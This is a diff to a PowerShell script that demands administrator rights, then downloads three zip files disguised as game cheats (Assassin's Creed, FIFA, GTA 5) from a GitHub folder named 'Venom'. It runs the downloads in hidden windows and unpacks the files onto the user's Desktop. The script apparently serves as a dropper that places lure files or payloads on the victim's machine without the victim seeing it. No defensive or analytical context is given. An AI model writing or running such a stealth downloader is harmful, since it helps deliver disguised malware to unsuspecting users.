@@ -1,10 +1,8 @@
 
+$zipFilePath = "$env:TEMP"
 $zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
-$zipFilePath = "$env:TEMP\AssassinsCreed_SE.zip"
-$zipUrl_1 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-2025-Cheats.zip"
-$zipFilePath_1 = "$env:TEMP\Fifa-2025-Cheats.zip"
-$zipUrl_2 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Gta5-Cheats-Ps5.zip"
-$zipFilePath_2 = "$env:TEMP\Gta5-Cheats-Ps5.zip"
+$zipUrl_1 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-Ps5.zip"
+$zipUrl_2 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/gta5-Ps5.zip"
 $desktopPath = [System.Environment]::GetFolderPath("Desktop")
 
 function Test-IsAdmin {
@@ -18,17 +16,17 @@ if (-not (Test-IsAdmin)) {
     Exit
 }
 
-powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
+powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl -OutFile "$zipFilePath\AssassinsCreed_SE.zip"
 
-powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_1 -OutFile $zipFilePath_1
+powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_1 -OutFile "$zipFilePath\Fifa-Ps5.zip"
 
-powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_2 -OutFile $zipFilePath_2
+powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_2 -OutFile "$zipFilePath\gta5-Ps5.zip"
 
-Expand-Archive -Path $zipFilePath -DestinationPath $desktopPath -Force
+Expand-Archive -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath -Force
 
-Expand-Archive -Path $zipFilePath_1 -DestinationPath $desktopPath -Force
+Expand-Archive -Path "$zipFilePath\Fifa-Ps5.zip" -DestinationPath $desktopPath -Force
 
-Expand-Archive -Path $zipFilePath_2 -DestinationPath $desktopPath -Force
+Expand-Archive -Path "$zipFilePath\gta5-Ps5.zip" -DestinationPath $desktopPath -Force
 
 Start-Sleep -Seconds 240
 
